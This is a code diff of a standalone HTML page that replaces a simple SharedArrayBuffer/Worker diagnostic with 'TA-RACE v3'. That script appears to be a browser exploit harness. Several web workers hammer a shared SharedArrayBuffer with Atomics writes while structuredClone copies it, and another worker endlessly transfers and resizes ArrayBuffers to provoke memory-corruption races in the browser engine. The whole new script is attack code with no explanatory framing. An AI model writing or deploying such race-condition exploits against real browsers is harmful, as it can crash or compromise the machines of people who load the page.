@@ -1,16 +1,68 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>diag</title>
-<body style="background:#000;color:#0f0;font:16px monospace;white-space:pre-wrap;margin:10px">
-<div id="o">[diag] v1</div>
+<title>TA-RACE v3</title>
+<body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
+<div id=o>[TA-RACE v3]</div>
 <script>
-var o = document.getElementById("o");
-function log(m){ o.textContent = o.textContent + "\n" + m; }
-log("L1 script alive");
-log("L2 SAB type: " + typeof SharedArrayBuffer);
-try { var s = new SharedArrayBuffer(16); log("L3 SAB created OK len=" + s.byteLength); }
-catch(e){ log("L3 SAB blocked: " + e.name); }
-try { var w = new Worker(URL.createObjectURL(new Blob(["var x=1;"]))); log("L5 worker OK"); }
-catch(e){ log("L5 worker fail: " + e.name); }
-log("L6 done");
+const o=document.getElementById('o');
+const log=m=>{o.textContent+="\n"+m;};
+const tick=()=>new Promise(r=>setTimeout(r,0));
+window.addEventListener('error',e=>log("[ERROR] "+e.message+" @ "+(e.lineno||"?")));
+log("[*] UA: "+navigator.userAgent);
+log("[*] SAB: "+(typeof SharedArrayBuffer!=="undefined"?"AVAILABLE":"BLOCKED - need COOP/COEP headers"));
+
+const WK=`let u8=null;
+onmessage=async e=>{
+  if(e.data.sab){
+    u8=new Uint8Array(e.data.sab);
+    log2("worker "+e.data.who+" on SAB");
+    let i=0;
+    while(true){
+      try{structuredClone(u8.subarray(0,256));}catch(_){}
+      Atomics.store(u8,(i>>>0)&0xFFFF,i&0xFF);
+      if((++i&0xFFF)===0) await new Promise(r=>setTimeout(r,0));
+    }
+  }
+};
+function log2(m){postMessage({log:m});}`;
+
+const wA=new Worker(URL.createObjectURL(new Blob([WK])));
+const wB=new Worker(URL.createObjectURL(new Blob([WK])));
+const wR=new Worker(URL.createObjectURL(new Blob([`
+onmessage=e=>{ for(const ab of e.data.abs){ try{new Uint8Array(ab)[0]=0x41;}catch(_){} try{postMessage({abs:[ab]},[ab]);}catch(_){} } };
+`])));
+log("[1] 3 workers up");
+wA.onmessage=e=>{if(e.data.log)log(e.data.log);};
+wB.onmessage=e=>{if(e.data.log)log(e.data.log);};
+
+let sab=null, mu8=null;
+try{
+  sab=new SharedArrayBuffer(0x10000);
+  mu8=new Uint8Array(sab);
+  wA.postMessage({sab,who:'A'});
+  wB.postMessage({sab,who:'B'});
+  log("[2] SAB shared -> workers");
+}catch(e){log("[FAIL] SAB: "+e.name);}
+
+let inFlight=0;
+wR.onmessage=e=>{
+  for(const ab of e.data.abs){
+    inFlight--;
+    try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
+  }
+};
+
+(async()=>{
+  let it=0;
+  while(true){
+    if(inFlight<64){
+      const ab=new ArrayBuffer(256,{maxByteLength:65536});
+      try{ab.resize(4096);}catch(_){}
+      try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
+    }
+    if(mu8){try{structuredClone(mu8.subarray(0,256));}catch(_){}}
+    it++;
+    if((it&0x3FF)===0){log("[*] it="+it+" inflight="+inFlight);await tick();}
+  }
+})();
 </script>
